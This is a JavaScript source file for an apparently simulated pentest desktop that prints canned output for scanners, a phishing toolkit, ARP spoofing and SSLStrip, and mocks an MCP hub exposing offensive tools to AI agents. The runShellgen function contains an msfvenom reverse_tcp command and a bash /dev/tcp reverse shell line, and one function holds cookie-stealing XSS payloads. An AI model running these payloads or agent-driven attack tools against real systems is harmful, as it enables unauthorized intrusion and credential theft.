  const type = document.getElementById(`dns-type-${winId}`)?.value || 'A';
  runSimple(winId,`dns-out-${winId}`,`dns-bar-${winId}`,[
    `<span class="out-header">[*] DNS Lookup: ${type} records for ${domain}</span>`,
    `<span class="out-success">${domain}. 300 IN A 93.184.216.34</span>`,
    `<span class="out-success">${domain}. 300 IN A 93.184.216.35</span>`,
    `<span class="out-line">;; Query time: 12 msec</span>`,
    `<span class="out-line">;; SERVER: 8.8.8.8#53(8.8.8.8)</span>`,
  ]);
}

function runTraceroute(winId) {
  const host = document.getElementById(`tr-host-${winId}`)?.value || 'google.com';
  const hops = ['192.168.1.1','10.0.0.1','74.125.1.1','72.14.209.49','108.170.245.65',host].map((h,i)=>
    `<span class="out-line">${i+1}  ${h}  ${(Math.random()*20+2).toFixed(3)} ms</span>`
  );
  runSimple(winId,`tr-out-${winId}`,`tr-bar-${winId}`,[
    `<span class="out-header">traceroute to ${host}</span>`, ...hops,
    `<span class="out-success">Trace complete.</span>`
  ]);
}

function runSubdomains(winId) {
  const domain = document.getElementById(`sub-domain-${winId}`)?.value || 'example.com';
  const subs = ['www','mail','ftp','admin','api','dev','staging','vpn','git','smtp'].map(s=>
    `<span class="out-success">[+] ${s}.${domain}  →  ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span>`
  );
  runSimple(winId,`sub-out-${winId}`,`sub-bar-${winId}`,[
    `<span class="out-header">[*] Enumerating subdomains for ${domain}...</span>`, ...subs,
    `<span class="out-success">[*] Found 10 subdomains</span>`
  ]);
}

function runNikto(winId) {
  const url = document.getElementById(`nikto-url-${winId}`)?.value || 'http://target.com';
  runSimple(winId,`nikto-out-${winId}`,`nikto-bar-${winId}`,[
    `<span class="out-header">- Nikto v2.1.6/2.1.5</span>`,
    `<span class="out-info">+ Target IP: 93.184.216.34</span>`,
    `<span class="out-warn">+ Server: Apache/2.4.54</span>`,
    `<span class="out-err">+ OSVDB-3092: /admin/: This might be interesting...</span>`,
    `<span class="out-err">+ /phpinfo.php: PHP information found</span>`,
    `<span class="out-warn">+ /robots.txt: Contains 3 disallowed entries</span>`,
    `<span class="out-err">+ Apache/2.4.54 appears to be outdated (current is at least Apache/2.4.57)</span>`,
    `<span class="out-success">+ 7 host(s) tested</span>`,
  ]);
}

function runOpenVAS(winId) {
  runSimple(winId,`ova-out-${winId}`,`ova-bar-${winId}`,[
    `<span class="out-header">[*] OpenVAS 22.4.1 starting scan...</span>`,
    `<span class="out-warn">[MEDIUM] SSH Weak Encryption Algorithms Supported</span>`,
    `<span class="out-err">[HIGH] MS17-010: SMB Remote Code Execution</span>`,
    `<span class="out-warn">[MEDIUM] HTTP Server Allows Insecure HTTP Methods</span>`,
    `<span class="out-err">[CRITICAL] SSL/TLS: OpenSSL Heartbleed Vulnerability</span>`,
    `<span class="out-success">[*] Scan complete. 4 vulnerabilities found.</span>`,
  ]);
}

function runWPScan(winId) {
  const url = document.getElementById(`wp-url-${winId}`)?.value || 'http://wp.example.com';
  runSimple(winId,`wp-out-${winId}`,`wp-bar-${winId}`,[
    `<span class="out-header">_  _____  _____                </span>`,
    `<span class="out-info">[*] Scanning WordPress at ${url}</span>`,
    `<span class="out-warn">[!] WordPress version 5.4.2 identified (EOL)</span>`,
    `<span class="out-err">[!] Plugin: contact-form-7 v5.1.1 - SQL Injection vulnerability</span>`,
    `<span class="out-warn">[i] Theme: twentytwenty v1.2</span>`,
    `<span class="out-success">[i] User identified: admin</span>`,
  ]);
}

function runXSSHunter(winId) {
  runSimple(winId,`xss-out-${winId}`,`xss-bar-${winId}`,[
    `<span class="out-info">[*] Starting XSS scan...</span>`,
    `<span class="out-warn">[?] Testing: &lt;script&gt;alert(1)&lt;/script&gt;</span>`,
    `<span class="out-warn">[?] Testing: &lt;img src=x onerror=alert(1)&gt;</span>`,
    `<span class="out-err">[+] Reflected XSS found in parameter: search</span>`,
    `<span class="out-err">[+] Payload: &lt;img src=x onerror=alert(document.cookie)&gt;</span>`,
    `<span class="out-success">[*] 1 XSS vulnerability found</span>`,
  ]);
}

function runDirb(winId) {
  const url = document.getElementById(`dirb-url-${winId}`)?.value || 'http://target.com';
  runSimple(winId,`dirb-out-${winId}`,`dirb-bar-${winId}`,[
    `<span class="out-header">DirBuster 1.0-RC1</span>`,
    `<span class="out-success">+ ${url}/admin (CODE:200|SIZE:4521)</span>`,
    `<span class="out-success">+ ${url}/login (CODE:200|SIZE:2134)</span>`,
    `<span class="out-success">+ ${url}/backup (CODE:301|SIZE:0)</span>`,
    `<span class="out-warn">+ ${url}/.git (CODE:403|SIZE:289)</span>`,
    `<span class="out-success">+ ${url}/phpinfo.php (CODE:200|SIZE:47392)</span>`,
    `<span class="out-success">[*] Total: 5 directories/files found</span>`,
  ]);
}

function runWordlist(winId) {
  const min = document.getElementById(`wl-min-${winId}`)?.value || 4;
  const max = document.getElementById(`wl-max-${winId}`)?.value || 6;
  const charset = document.getElementById(`wl-charset-${winId}`)?.value || 'abc123';
  const samples = ['aaaa','aaab','aaac','aa12','ab12','abc1','1234','1a2b','abcd','zyx9','test','pass'].filter(s=>s.length>=min&&s.length<=max);
  runSimple(winId,`wl-out-${winId}`,`wl-bar-${winId}`,[
    `<span class="out-info">Generating wordlist... (length ${min}-${max}, charset: ${charset})</span>`,
    ...samples.map(s=>`<span class="out-line">${s}</span>`),
    `<span class="out-success">[+] Generated ${samples.length} words (preview only)</span>`,
  ]);
}

function runWifiAnalyzer(winId) {
  runSimple(winId,`wifi-out-${winId}`,`wifi-bar-${winId}`,[
    `<span class="out-header">WiFi Analyzer - Detected Networks</span>`,
    `<span class="out-success">HomeNetwork_5G    CH:36  -62dBm  WPA2  AA:BB:CC:DD:EE:01</span>`,
    `<span class="out-line">NETGEAR_Office    CH:11  -71dBm  WPA2  11:22:33:44:55:02</span>`,
    `<span class="out-warn">OldRouter         CH:1   -55dBm  WEP   DE:AD:BE:EF:00:03</span>`,
    `<span class="out-success">SecureNet_2.4     CH:6   -67dBm  WPA3  00:11:22:33:44:05</span>`,
  ]);
}

function runKismet(winId) {
  runSimple(winId,`kismet-out-${winId}`,`kismet-bar-${winId}`,[
    `<span class="out-header">Kismet 2023-07-R1 starting...</span>`,
    `<span class="out-info">[*] Sourcetracker spawned</span>`,
    `<span class="out-success">[+] Found SSID: HomeNetwork_5G</span>`,
    `<span class="out-success">[+] Found SSID: SecureNet</span>`,
    `<span class="out-warn">[!] WEP network detected: OldRouter</span>`,
  ]);
}

function runSET(winId) {
  runSimple(winId,`set-out-${winId}`,`set-bar-${winId}`,[
    `<span class="out-header">Social-Engineer Toolkit 8.0.3</span>`,
    `<span class="out-info">[*] Loading attack module...</span>`,
    `<span class="out-warn">[*] Phishing page cloned successfully</span>`,
    `<span class="out-success">[*] Listening on port 80 for credentials...</span>`,
    `<span class="out-success">[+] Credentials received: admin:password123</span>`,
  ]);
}

function runShellgen(winId) {
  const lhost = document.getElementById(`sg-lhost-${winId}`)?.value || '192.168.1.100';
  const lport = document.getElementById(`sg-lport-${winId}`)?.value || '4444';
  runSimple(winId,`sg-out-${winId}`,`sg-bar-${winId}`,[
    `<span class="out-header">[*] Generating payload...</span>`,
    `<span class="out-info">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf</span>`,
    `<span class="out-success">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>`,
    `<span class="out-success">[*] Payload size: 250 bytes</span>`,
    `<span class="out-success">[*] Final size of elf file: 370 bytes</span>`,
    `<span class="out-success">[+] Saved as: /root/payload.elf</span>`,
    `<span class="out-warn">bash -i >& /dev/tcp/${lhost}/${lport} 0>&1</span>`,
  ]);
}

function runArpSpoof(winId) {
  const target = document.getElementById(`arp-target-${winId}`)?.value || '192.168.1.1';
  const gw = document.getElementById(`arp-gateway-${winId}`)?.value || '192.168.1.254';
  runSimple(winId,`arp-out-${winId}`,`arp-bar-${winId}`,[
    `<span class="out-warn">[!] ARP poisoning attack started</span>`,
    `<span class="out-info">[*] Sending ARP replies to ${target} spoofing ${gw}</span>`,
    `<span class="out-info">[*] Sending ARP replies to ${gw} spoofing ${target}</span>`,
    `<span class="out-success">[+] MITM position established. Forwarding enabled.</span>`,
  ]);
}

function runSSLStrip(winId) {
  runSimple(winId,`ssl-out-${winId}`,`ssl-bar-${winId}`,[
    `<span class="out-warn">[!] SSLStrip 0.9 starting...</span>`,
    `<span class="out-info">[*] Listening on port 8080</span>`,
    `<span class="out-success">[+] HTTPS → HTTP downgrade active</span>`,
    `<span class="out-warn">[!] Credentials captured: username=admin&password=secret123</span>`,
  ]);
}

function runBinwalk(winId) {
  runSimple(winId,`bw-out-${winId}`,`bw-bar-${winId}`,[
    `<span class="out-header">DECIMAL       HEXADECIMAL     DESCRIPTION</span>`,
    `<span class="out-success">0             0x0             TRX firmware header, image size: 6000640</span>`,
    `<span class="out-info">28            0x1C            LZMA compressed data</span>`,
    `<span class="out-success">1310720       0x140000        Squashfs filesystem, LE</span>`,
    `<span class="out-info">5242880       0x500000        JFFS2 filesystem</span>`,
  ]);
}

function runAutopsy(winId) {
  runSimple(winId,`aut-out-${winId}`,`aut-bar-${winId}`,[
    `<span class="out-header">[*] Autopsy 4.21.0 starting analysis...</span>`,
    `<span class="out-info">[*] Parsing file system: NTFS</span>`,
    `<span class="out-success">[+] 23,451 files indexed</span>`,
    `<span class="out-warn">[!] Deleted files found: 142</span>`,
    `<span class="out-err">[!] Suspicious file: /Users/Admin/secret_docs.zip</span>`,
    `<span class="out-success">[*] Analysis complete</span>`,
  ]);
}

function runSteghide(winId) {
  runSimple(winId,`steg-out-${winId}`,`steg-bar-${winId}`,[
    `<span class="out-info">[*] Steghide 0.5.1 starting...</span>`,
    `<span class="out-success">[+] Hidden data found in image</span>`,
    `<span class="out-success">[+] Extracted to: hidden_message.txt</span>`,
    `<span class="out-warn">Contents: "The flag is: CTF{hidden_in_plain_sight}"</span>`,
  ]);
}

// ============ MODEL CONTEXT PROTOCOL (MCP) STATE & ENGINES ============
window.MCP_STATE = window.MCP_STATE || {
  servers: [
    { id: 'buildu-sec', name: 'buildu-security-mcp', status: 'online', transport: 'stdio / JSON-RPC', port: '8765', toolsCount: 6, desc: 'Model Context Protocol server exposing BuildU pentest tools (Nmap, SQLMap, Hash Cracker, DirBuster, Metasploit, Shellgen) to AI agents.', latency: '12ms' },
    { id: 'mcp-rag', name: 'mcp-server-rag', status: 'online', transport: 'FastAPI / SSE', port: '8000', toolsCount: 3, desc: 'ChromaDB vector store + LangChain RAG engine from mcp-hub/llm for threat intel and CVE lookups.', latency: '19ms' },
    { id: 'cve-analyzer', name: 'cve-analyzer-mcp', status: 'online', transport: 'HTTP Stream', port: '8002', toolsCount: 4, desc: 'Live CVE vulnerability feeds, CVSS scoring calculator, and exploit mitigations.', latency: '16ms' },
    { id: 'weather', name: 'weather-mcp', status: 'standby', transport: 'stdio (uv)', port: '--', toolsCount: 2, desc: 'Example MCP server from mcp-hub repository providing real-time alerts and forecasts.', latency: '--' },
    { id: 'github-mcp', name: 'github-mcp-server', status: 'standby', transport: 'Docker stdio', port: '--', toolsCount: 8, desc: 'GitHub official MCP server for repo auditing, commits, and PR automation.', latency: '--' },
  ],
  tools: [
    { id: 'nmap_scan', server: 'buildu-security-mcp', name: 'buildu.nmap_scan', desc: 'Execute network reconnaissance scan against IP/hostname', defaultParams: '{\n  "target": "192.168.1.105",\n  "ports": "1-1000",\n  "scan_type": "-sS -sV"\n}' },
    { id: 'sqlmap_inject', server: 'buildu-security-mcp', name: 'buildu.sqlmap_inject', desc: 'Perform automated SQL injection testing and database enumeration', defaultParams: '{\n  "url": "http://10.10.10.24/login.php",\n  "risk": 2,\n  "action": "enumerate_dbs"\n}' },
    { id: 'hash_crack', server: 'buildu-security-mcp', name: 'buildu.hash_crack', desc: 'Crack cryptographic hash using WebCrypto wordlist engine', defaultParams: '{\n  "hash": "5f4dcc3b5aa765d61d8327deb882cf99",\n  "algorithm": "MD5",\n  "wordlist": "rockyou.txt"\n}' },
    { id: 'dirb_enum', server: 'buildu-security-mcp', name: 'buildu.dirb_enum', desc: 'Enumerate hidden web directories and endpoint paths', defaultParams: '{\n  "url": "http://192.168.1.105",\n  "wordlist": "common.txt"\n}' },
    { id: 'rag_cve_lookup', server: 'mcp-server-rag', name: 'rag.query_threat_intel', desc: 'Query local vector store for CVE details and exploit mitigations', defaultParams: '{\n  "query": "Remote code execution in Apache Log4j CVE-2021-44228",\n  "top_k": 3\n}' },
    { id: 'cve_advisory', server: 'cve-analyzer-mcp', name: 'cve.fetch_advisory', desc: 'Fetch latest CVE details from NVD / MITRE database', defaultParams: '{\n  "cve_id": "CVE-2023-38606",\n  "include_poc": true\n}' }
  ],
  logs: [
    `[${new Date().toLocaleTimeString()}] [MCP-Hub Core] Runtime v1.6.0 loaded via uv environment`,
    `[${new Date().toLocaleTimeString()}] [buildu-security-mcp] Server active: 6 tools, 4 resources registered`,
    `[${new Date().toLocaleTimeString()}] [mcp-server-rag] Connected to Chroma vectorstore (mcp-hub/llm/doc_hub)`,
    `[${new Date().toLocaleTimeString()}] [Transport Bridge] stdio & SSE protocol listener ready on 127.0.0.1:8765`,
  ]
};

// ============ BUILD MCP HUB HTML ============
function buildMCPHubHTML(winId) {
  return `
  <div class="mcp-container">
    <div class="mcp-tabs" id="mcptabs-${winId}">
      <div class="mcp-tab active" id="mtab-servers-${winId}" onclick="switchMCPTab('servers','${winId}')">⚡ Servers</div>
      <div class="mcp-tab" id="mtab-tools-${winId}" onclick="switchMCPTab('tools','${winId}')">🛠️ Tools Explorer</div>
      <div class="mcp-tab" id="mtab-scaffolder-${winId}" onclick="switchMCPTab('scaffolder','${winId}')">📦 Server Generator</div>
      <div class="mcp-tab" id="mtab-claude-${winId}" onclick="switchMCPTab('claude','${winId}')">🤖 Claude / Agent Config</div>
      <div class="mcp-tab" id="mtab-logs-${winId}" onclick="switchMCPTab('logs','${winId}')">📜 Protocol Logs</div>
    </div>
    <div class="mcp-body" id="mcpbody-${winId}">
      ${renderMCPServersTab(winId)}
    </div>
  </div>`;
}

function renderMCPServersTab(winId) {
  const servers = window.MCP_STATE.servers;
  return `
  <div style="display:flex;justify-content:space-between;align-items:center">
    <div>
      <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">Model Context Protocol Servers</h3>
      <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Connected MCP backends powered by mcp-hub & BuildU Security Suite</p>
    </div>
    <div style="display:flex;gap:8px">
      <button class="tool-btn btn-primary" onclick="refreshMCPServers('${winId}')">🔄 Refresh</button>
      <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-primary)" onclick="switchMCPTab('scaffolder','${winId}')">＋ New Server</button>
    </div>
  </div>

  <div class="mcp-server-grid" id="mcp-grid-${winId}">
    ${servers.map(s => `
      <div class="mcp-server-card" id="scard-${s.id}-${winId}">
        <div>
          <div class="mcp-server-header">
            <span class="mcp-server-title">⚡ ${s.name}</span>
            <span class="mcp-badge ${s.status}" id="sbadge-${s.id}-${winId}">
              <span class="mcp-badge-dot"></span> ${s.status.toUpperCase()}
            </span>
          </div>
          <div class="mcp-server-desc">${s.desc}</div>
        </div>
        <div>
          <div class="mcp-server-meta">
            <span>Transport: <b>${s.transport}</b></span>
            <span>Port: <b>${s.port}</b></span>
            <span>Tools: <b>${s.toolsCount}</b></span>
            <span>Latency: <b id="slat-${s.id}-${winId}">${s.latency}</b></span>
          </div>
          <div class="mcp-server-actions">
            <button class="tool-btn ${s.status === 'online' ? 'btn-danger' : 'btn-success'}" id="sbtn-toggle-${s.id}-${winId}" onclick="toggleMCPServer('${s.id}','${winId}')">
              ${s.status === 'online' ? '■ Stop' : '▶ Start'}
            </button>
            <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-secondary)" onclick="pingMCPServer('${s.id}','${winId}')">
              📡 Ping
            </button>
            <button class="tool-btn" style="border:1px solid var(--border);color:var(--accent-cyan)" onclick="switchMCPTab('tools','${winId}')">
              Inspect Tools →
            </button>
          </div>
        </div>
      </div>
    `).join('')}
  </div>

  <div style="background:rgba(0,245,255,0.03);border:1px dashed var(--border);border-radius:var(--radius);padding:12px;margin-top:6px;display:flex;align-items:center;justify-content:space-between">
    <div style="font-size:0.75rem;color:var(--text-secondary)">
      <b style="color:var(--accent-cyan)">Python Backend Bridge:</b> Run <code style="color:var(--accent-green);font-family:var(--font-mono)">uv run mcp_bridge.py</code> in terminal to connect live Python subprocesses directly.
    </div>
    <button class="tool-btn btn-primary" onclick="openApp('terminal');setTimeout(()=>processTermCmd('mcp status',document.querySelector('.terminal-output'),'terminal',0),500)">Terminal MCP</button>
  </div>`;
}

function renderMCPToolsTab(winId) {
  const tools = window.MCP_STATE.tools;
  const initialTool = tools[0];
  return `
  <div style="display:flex;gap:16px;height:100%">
    <!-- Tool Selection & Details -->
    <div style="flex:1;display:flex;flex-direction:column;gap:12px">
      <div class="tool-section">
        <div class="tool-section-title">Select MCP Tool</div>
        <select class="tool-select" id="mcp-tool-select-${winId}" style="width:100%" onchange="onMCPToolChange('${winId}')">
          ${tools.map(t => `<option value="${t.id}">${t.name} (${t.server})</option>`).join('')}
        </select>
        <p id="mcp-tool-desc-${winId}" style="font-size:0.75rem;color:var(--text-secondary);margin:8px 0 0 0">
          ${initialTool.desc}
        </p>
      </div>

      <div class="tool-section" style="flex:1;display:flex;flex-direction:column">
        <div class="tool-section-title">JSON-RPC 2.0 Parameters (arguments)</div>
        <textarea id="mcp-tool-params-${winId}" class="tool-input" style="flex:1;font-family:var(--font-mono);font-size:0.78rem;resize:none;min-height:140px;color:var(--accent-cyan)">${initialTool.defaultParams}</textarea>
        <div style="display:flex;gap:8px;margin-top:10px">
          <button class="tool-btn btn-primary" onclick="invokeMCPTool('${winId}')">▶ Call Tool (tools/call)</button>
          <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="resetMCPToolParams('${winId}')">Reset</button>
        </div>
      </div>
    </div>

    <!-- Invocation Output -->
    <div style="flex:1.2;display:flex;flex-direction:column">
      <div class="tool-section-title" style="margin-bottom:8px">MCP Response Output</div>
      <div class="tool-output" id="mcp-tool-out-${winId}" style="flex:1;min-height:280px;white-space:pre-wrap;font-size:0.75rem;line-height:1.6">
        <span class="out-info">// Ready to invoke tool via JSON-RPC protocol.</span>
        <span class="out-line">// Click 'Call Tool' to test tool execution and view response payload.</span>
      </div>
      <div id="mcp-gui-bridge-${winId}" style="display:none;margin-top:8px">
        <button class="tool-btn btn-success" id="mcp-gui-bridge-btn-${winId}">↗ Open in BuildU GUI Tool</button>
      </div>
    </div>
  </div>`;
}

function renderMCPScaffolderTab(winId) {
  return `
  <div style="max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:14px">
    <div>
      <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">MCP Server Generator (create_mcp_server.py)</h3>
      <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Scaffold complete Model Context Protocol servers using uv, FastMCP, and Python.</p>
    </div>

    <div class="tool-section">
      <div class="tool-row">
        <div class="tool-field" style="flex:2">
          <label>Server Name</label>
          <input class="tool-input" id="scaff-name-${winId}" value="shodan-recon-mcp" placeholder="e.g. shodan-recon-mcp" />
        </div>
        <div class="tool-field" style="flex:1">
          <label>Transport</label>
          <select class="tool-select" id="scaff-trans-${winId}">
            <option value="stdio">stdio (Standard I/O)</option>
            <option value="sse">SSE (Server-Sent Events)</option>
            <option value="http">HTTP / Stream</option>
          </select>
        </div>
      </div>

      <div class="tool-row" style="margin-top:10px">
        <div class="tool-field" style="flex:1">
          <label>Description</label>
          <input class="tool-input" id="scaff-desc-${winId}" value="MCP server for automated Shodan intelligence queries" />
        </div>
      </div>

      <div class="tool-section-title" style="margin-top:14px">Dependencies (via uv)</div>
      <div class="tool-checkboxes">
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-mcp-${winId}" checked disabled> mcp[cli]&gt;=1.6.0</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-httpx-${winId}" checked> httpx (Async HTTP)</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-pydantic-${winId}" checked> pydantic</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-pillow-${winId}"> Pillow (Computer Vision)</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-langchain-${winId}"> langchain (RAG)</label>
      </div>

      <div style="margin-top:14px;display:flex;gap:10px">
        <button class="tool-btn btn-primary" onclick="generateMCPServerScaffold('${winId}')">⚡ Generate MCP Project</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="previewScaffoldCode('${winId}')">👁️ Preview Code</button>
      </div>
    </div>

    <div class="tool-output" id="scaff-out-${winId}" style="min-height:160px;max-height:220px">
      <span class="out-info">// Enter configuration and click Generate.</span>
      <span class="out-line">// Files will be created in Virtual File System: /root/mcp-hub/mcp-servers/&lt;name&gt;/</span>
    </div>
  </div>`;
}

function renderMCPClaudeConfigTab(winId) {
  const configObj = {
    mcpServers: {
      "buildu-security": {
        command: "python3",
        args: ["/root/mcp-hub/servers/buildu-security-mcp.py"]
      },
      "mcp-server-rag": {
        command: "python3",
        args: ["/root/mcp-hub/llm/mcp_server_rag.py"]
      },
      "weather": {
        command: "uv",
        args: ["--directory", "mcp-hub/mcp-servers/weather", "run", "weather.py"]
      },
      "github": {
        command: "docker",
        args: ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"],
        env: {
          "GITHUB_PERSONAL_ACCESS_TOKEN": "<YOUR_TOKEN>"
        }
      }
    }
  };
  const jsonStr = JSON.stringify(configObj, null, 2);

  return `
  <div style="max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:14px">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">Claude Desktop & Agent Configuration</h3>
        <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Add this configuration to Claude Desktop, Cursor, or your AI client to access BuildU tools.</p>
      </div>
      <button class="tool-btn btn-primary" onclick="copyClaudeConfig('${winId}')">📋 Copy JSON</button>
    </div>

    <div class="tool-section">
      <div class="tool-section-title">claude_desktop_config.json</div>
      <textarea id="claude-config-text-${winId}" class="tool-input" style="width:100%;height:260px;font-family:var(--font-mono);font-size:0.78rem;resize:vertical;color:#38bdf8">${jsonStr}</textarea>
    </div>

    <div style="display:flex;gap:10px">
      <button class="tool-btn btn-success" onclick="saveClaudeConfigToVFS('${winId}')">💾 Save to VFS (~/.config/claude/)</button>
      <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-secondary)" onclick="showToast('MCP Hub','Config tested successfully against schema','success','✅')">Validate Schema</button>
    </div>
  </div>`;
}

function renderMCPLogsTab(winId) {
  const logs = window.MCP_STATE.logs;
  return `
  <div style="display:flex;flex-direction:column;height:100%;gap:10px">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan);font-weight:700">JSON-RPC 2.0 Live Message Stream</span>
      <div style="display:flex;gap:8px">
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim);padding:4px 10px;font-size:0.72rem" onclick="clearMCPLogs('${winId}')">Clear Logs</button>
      </div>
    </div>
    <div class="tool-output" id="mcp-log-stream-${winId}" style="flex:1;max-height:none;min-height:300px;font-family:var(--font-mono);font-size:0.73rem">
      ${logs.map(l => `<div style="margin-bottom:3px;color:#94a3b8">${escHtml(l)}</div>`).join('')}
    </div>
  </div>`;
}

// ============ MCP HUB HANDLERS ============
function switchMCPTab(tab, winId) {
  const tabs = ['servers', 'tools', 'scaffolder', 'claude', 'logs'];
  tabs.forEach(t => {
    const el = document.getElementById(`mtab-${t}-${winId}`);
    if (el) el.classList.toggle('active', t === tab);
  });
  const body = document.getElementById(`mcpbody-${winId}`);
  if (!body) return;

  if (tab === 'servers') body.innerHTML = renderMCPServersTab(winId);
  else if (tab === 'tools') body.innerHTML = renderMCPToolsTab(winId);
  else if (tab === 'scaffolder') body.innerHTML = renderMCPScaffolderTab(winId);
  else if (tab === 'claude') body.innerHTML = renderMCPClaudeConfigTab(winId);
  else if (tab === 'logs') body.innerHTML = renderMCPLogsTab(winId);
}

function toggleMCPServer(serverId, winId) {
  const server = window.MCP_STATE.servers.find(s => s.id === serverId);
  if (!server) return;
  const isOnline = server.status === 'online';
  server.status = isOnline ? 'offline' : 'online';
  server.latency = isOnline ? '--' : `${Math.floor(Math.random() * 20 + 8)}ms`;

  addMCPLog(`[${server.name}] State changed to ${server.status.toUpperCase()}`);
  showToast('MCP Hub', `${server.name} is now ${server.status.toUpperCase()}`, isOnline ? 'warn' : 'success', '⚡');

  const badge = document.getElementById(`sbadge-${serverId}-${winId}`);
  const btn = document.getElementById(`sbtn-toggle-${serverId}-${winId}`);
  const lat = document.getElementById(`slat-${serverId}-${winId}`);

  if (badge) {
    badge.className = `mcp-badge ${server.status}`;
    badge.innerHTML = `<span class="mcp-badge-dot"></span> ${server.status.toUpperCase()}`;
  }
  if (btn) {
    btn.className = `tool-btn ${server.status === 'online' ? 'btn-danger' : 'btn-success'}`;
    btn.innerHTML = server.status === 'online' ? '■ Stop' : '▶ Start';
  }
  if (lat) lat.textContent = server.latency;
}

function pingMCPServer(serverId, winId) {
  const server = window.MCP_STATE.servers.find(s => s.id === serverId);
  if (!server) return;
  if (server.status === 'offline') {
    showToast('MCP Hub', `Cannot ping ${server.name} (server is offline)`, 'error', '❌');
    return;
  }
  const ms = Math.floor(Math.random() * 15 + 6);
  server.latency = `${ms}ms`;
  const lat = document.getElementById(`slat-${serverId}-${winId}`);
  if (lat) lat.textContent = server.latency;
  addMCPLog(`[JSON-RPC 2.0] ping -> ${server.name} pong: ${ms}ms`);
  showToast('MCP Hub', `Ping ${server.name}: ${ms}ms (OK)`, 'success', '📡');
}

function refreshMCPServers(winId) {
  showToast('MCP Hub', 'Scanned active MCP servers & local transports', 'info', '🔄');
  const body = document.getElementById(`mcpbody-${winId}`);
  if (body) body.innerHTML = renderMCPServersTab(winId);
}

function onMCPToolChange(winId) {
  const select = document.getElementById(`mcp-tool-select-${winId}`);
  if (!select) return;
  const tool = window.MCP_STATE.tools.find(t => t.id === select.value);
  if (!tool) return;
  const desc = document.getElementById(`mcp-tool-desc-${winId}`);
  const params = document.getElementById(`mcp-tool-params-${winId}`);
  if (desc) desc.textContent = tool.desc;
  if (params) params.value = tool.defaultParams;
}

function resetMCPToolParams(winId) {
  onMCPToolChange(winId);
}

function invokeMCPTool(winId) {
  const select = document.getElementById(`mcp-tool-select-${winId}`);
  const paramsArea = document.getElementById(`mcp-tool-params-${winId}`);
  const out = document.getElementById(`mcp-tool-out-${winId}`);
  const bridgeBox = document.getElementById(`mcp-gui-bridge-${winId}`);
  const bridgeBtn = document.getElementById(`mcp-gui-bridge-btn-${winId}`);
  if (!select || !paramsArea || !out) return;

  const tool = window.MCP_STATE.tools.find(t => t.id === select.value);
  if (!tool) return;

  let parsedArgs = {};
  try {
    parsedArgs = JSON.parse(paramsArea.value);
  } catch (err) {
    out.innerHTML = `<span class="out-err">[!] Invalid JSON Arguments: ${escHtml(err.message)}</span>`;
    return;
  }

  out.innerHTML = `<span class="out-info">[*] Sending JSON-RPC 2.0 Request to '${tool.server}'...</span>\n` +
    `<span style="color:var(--text-dim)">&gt; {"jsonrpc":"2.0","method":"tools/call","params":{"name":"${tool.name}","arguments":${JSON.stringify(parsedArgs)}}, "id": ${Date.now()}}</span>\n\n` +
    `<span class="out-header">[*] Executing '${tool.name}' via MCP runtime...</span>`;

  addMCPLog(`[tools/call] Invoked ${tool.name} with params: ${JSON.stringify(parsedArgs)}`);

  setTimeout(() => {
    let resultPayload = {};
    let guiAppToOpen = null;

    if (tool.id === 'nmap_scan') {
      const target = parsedArgs.target || '192.168.1.105';
      resultPayload = {
        status: "success",
        tool: "buildu.nmap_scan",
        target: target,
        open_ports: [
          { port: 22, protocol: "tcp", state: "open", service: "OpenSSH 8.9p1" },
          { port: 80, protocol: "tcp", state: "open", service: "Apache httpd 2.4.52" },
          { port: 3306, protocol: "tcp", state: "open", service: "MySQL 8.0.32" }
        ],
        vulnerabilities_detected: 1,
        os_guess: "Linux 5.4 - 5.15 (Ubuntu/Debian)"
      };
      guiAppToOpen = 'nmap';
    } else if (tool.id === 'sqlmap_inject') {
      resultPayload = {
        status: "success",
        tool: "buildu.sqlmap_inject",
        target_url: parsedArgs.url,
        injection_type: "Boolean-based blind & Error-based",
        database_back_end: "MySQL >= 5.7",
        databases_enumerated: ["information_schema", "users_db", "buildu_sec"]
      };
      guiAppToOpen = 'sqlmap';
    } else if (tool.id === 'hash_crack') {
      resultPayload = {
        status: "success",
        tool: "buildu.hash_crack",
        hash: parsedArgs.hash,
        algorithm: parsedArgs.algorithm || "MD5",
        cracked_plaintext: "password",
        attempts: 1,
        time_elapsed_ms: 14.2
      };
      guiAppToOpen = 'hashcracker';
    } else if (tool.id === 'rag_cve_lookup') {
      resultPayload = {
        status: "success",
        tool: "rag.query_threat_intel",
        query: parsedArgs.query,
        documents: [
          {
            cve: "CVE-2021-44228",
            severity: "CRITICAL 10.0",
            summary: "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP.",
            remediation: "Upgrade to log4j 2.17.1 or set log4j2.formatMsgNoLookups=true"
          }
        ]
      };
    } else {
      resultPayload = {
        status: "success",
